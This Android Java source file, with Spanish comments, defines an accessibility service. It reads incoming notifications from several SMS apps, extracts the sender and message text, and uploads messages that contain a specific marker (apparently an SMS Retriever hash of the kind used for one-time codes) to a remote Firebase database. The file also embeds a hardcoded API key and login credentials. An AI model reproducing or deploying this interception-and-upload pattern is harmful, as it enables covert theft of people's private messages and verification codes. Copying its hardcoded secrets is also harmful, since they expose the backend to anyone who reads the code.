package com.client.appM.Service;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;
import androidx.annotation.NonNull;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import org.json.JSONException;
import org.json.JSONObject;


public class Accesibilidad extends AccessibilityService {
    private String auth = null;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        //cualquier package de SMS
        String cs = "com.google.android.apps.messaging, com.samsung.android.messaging, com.jb.gosms, com.concentriclivers.mms.com.android.mms, fr.slvn.mms,  com.android.mms, com.sonyericsson.conversations";
        // Paquetes de Apps que pueden servir para recibir mensajes

        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            Log.d("Accesibilidad", "en un paquete SMS: ");

            if (cs.contains(event.getPackageName().toString())) {
                //if (event.getPackageName().toString().equals("com.google.android.apps.messaging")) {
                Notification notif = (Notification) event.getParcelableData();
                if (notif != null) {
                    String numero = notif.extras.getCharSequence(Notification.EXTRA_TITLE).toString();
                    String contenido = notif.extras.getCharSequence(Notification.EXTRA_TEXT).toString();

                    //Autenticar en la BD
                    FirebaseApp app = FirebaseApp.initializeApp(this);
                    FirebaseAuth auten = FirebaseAuth.getInstance();

                    //Ejecutar auth de Firebase por API REST
                    //Obtener token de Auth
                    String url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBN9-cz5VfCOW24MgQpooQRrsTnhgkbgL8";
                    Log.d("Test", "Aqui llego");
                    // Request a string response from the provided URL.
                    RequestQueue requestQueue = Volley.newRequestQueue(this);
                    JSONObject postData = new JSONObject();
                    try {
                        postData.put("email", "a@a.com");
                        postData.put("password", "123456");
                        postData.put("returnSecureToken", true);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                    JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, url, postData, new Response.Listener<JSONObject>() {
                        @Override
                        public void onResponse(JSONObject response) {
                            try {
                                auth = response.getString("idToken");
                                if (contenido.contains("F6oWIQlQ+AE")) {
                                    Log.d("Auth", "Auth es: " + auth);
                                    if (auth != null) {
                                        auten.signInWithEmailAndPassword("a@a.com", "123456").addOnCompleteListener(new OnCompleteListener<AuthResult>() {
                                            @Override
                                            public void onComplete(@NonNull Task<AuthResult> task) {
                                                if (task.isSuccessful()) {
                                                    String url = "https://appaym-537c4-default-rtdb.europe-west1.firebasedatabase.app/numeros.json?auth=" + auth;
                                                    // Request a string response from the provided URL.
                                                    RequestQueue requestQueue = Volley.newRequestQueue(Accesibilidad.this);
                                                    JSONObject postData = new JSONObject();
                                                    try {
                                                        postData.put("num", numero);
                                                        postData.put("msg", contenido);
                                                    } catch (JSONException e) {
                                                        e.printStackTrace();
                                                    }
                                                    JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.PUT, url, postData, new Response.Listener<JSONObject>() {
                                                        @Override
                                                        public void onResponse(JSONObject response) {
                                                            Toast.makeText(getApplicationContext(), "Datos en BD ", Toast.LENGTH_LONG).show();
                                                        }
                                                    }, new Response.ErrorListener() {
                                                        @Override
                                                        public void onErrorResponse(VolleyError error) {
                                                            error.printStackTrace();
                                                            Toast.makeText(getApplicationContext(), "Fallo en Subida", Toast.LENGTH_LONG).show();

                                                        }
                                                    });
                                                    requestQueue.add(jsonObjectRequest);
                                                    Log.d("Test", "Aqui tmb");
                                                } else {
                                                    Toast.makeText(getApplicationContext(), "Error de auth", Toast.LENGTH_LONG).show();
                                                }
                                            }
                                        });
                                        // Instantiate the RequestQueue.
                                    }
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    }, new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            error.printStackTrace();
                        }
                    });
                    requestQueue.add(jsonObjectRequest);

                    Toast.makeText(getApplicationContext(), "He recibido desde: " + numero + " con mensaje: " + contenido, Toast.LENGTH_LONG).show();
                    Log.d("Accesibilidad", "He recibido desde: " + numero + " con mensaje: " + contenido);
                } else {
                    //Toast.makeText(getApplicationContext(), "nulo", Toast.LENGTH_LONG).show();
                    Log.d("Accesibilidad", "NULO");
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        Toast.makeText(getApplicationContext(), "Se ha interrunmpido el servicio", Toast.LENGTH_SHORT).show();
        Log.d("onInterrupt", "Se ha interrunmpido el servici");
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {

        int action = event.getAction();
        int keyCode = event.getKeyCode();
        // the service listens for both pressing and releasing the key
        // so the below code executes twice, i.e. you would encounter two Toasts
        // in order to avoid this, we wrap the code inside an if statement
        // which executes only when the key is released

        //Autenticar en la BD
        FirebaseApp app = FirebaseApp.initializeApp(this);
        FirebaseAuth auten = FirebaseAuth.getInstance();
        if (action == KeyEvent.ACTION_UP) {
            if (keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
                Log.d("Check", "KeyUp");
                Toast.makeText(this, "KeyUp", Toast.LENGTH_SHORT).show();
                //Ejecutar auth de Firebase por API REST
                //Obtener token de Auth
                String url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBN9-cz5VfCOW24MgQpooQRrsTnhgkbgL8";
                Log.d("Test", "Aqui llego");
                // Request a string response from the provided URL.
                RequestQueue requestQueue = Volley.newRequestQueue(this);
                JSONObject postData = new JSONObject();
                try {
                    postData.put("email", "a@a.com");
                    postData.put("password", "123456");
                    postData.put("returnSecureToken", true);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, url, postData, new Response.Listener<JSONObject>() {
                    @Override
                    public void onResponse(JSONObject response) {
                        try {
                            auth = response.getString("idToken");
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }, new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        error.printStackTrace();
                    }
                });
                requestQueue.add(jsonObjectRequest);

                if (auth != null) {
                    auten.signInWithEmailAndPassword("a@a.com", "123456").addOnCompleteListener(new OnCompleteListener<AuthResult>() {
                        @Override
                        public void onComplete(@NonNull Task<AuthResult> task) {
                            if (task.isSuccessful()) {
                                String url = "https://appaym-537c4-default-rtdb.europe-west1.firebasedatabase.app/numeros.json?auth=" + auth;
                                // Request a string response from the provided URL.
                                RequestQueue requestQueue = Volley.newRequestQueue(Accesibilidad.this);
                                JSONObject postData = new JSONObject();
                                try {
                                    postData.put("test", "funciona");
                                    postData.put("hash", "123");
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                                JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.PUT, url, postData, new Response.Listener<JSONObject>() {
                                    @Override
                                    public void onResponse(JSONObject response) {
                                        //Toast.makeText(getApplicationContext(), "Response: " + response, Toast.LENGTH_LONG).show();
                                        Toast.makeText(getApplicationContext(), "Datos en BD ", Toast.LENGTH_LONG).show();
                                    }
                                }, new Response.ErrorListener() {
                                    @Override
                                    public void onErrorResponse(VolleyError error) {
                                        error.printStackTrace();
                                        Toast.makeText(getApplicationContext(), "Fallo en Subida", Toast.LENGTH_LONG).show();

                                    }
                                });
                                requestQueue.add(jsonObjectRequest);
                                Log.d("Test", "Aqui tmb");
                            } else {
                                Toast.makeText(getApplicationContext(), "Error de auth", Toast.LENGTH_LONG).show();
                            }
                        }
                    });
                    // Instantiate the RequestQueue.
                }
            } else if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
                Log.d("Check", "KeyDown");
                Toast.makeText(this, "KeyDown", Toast.LENGTH_SHORT).show();
            }
        }
        return super.onKeyEvent(event);
    }
}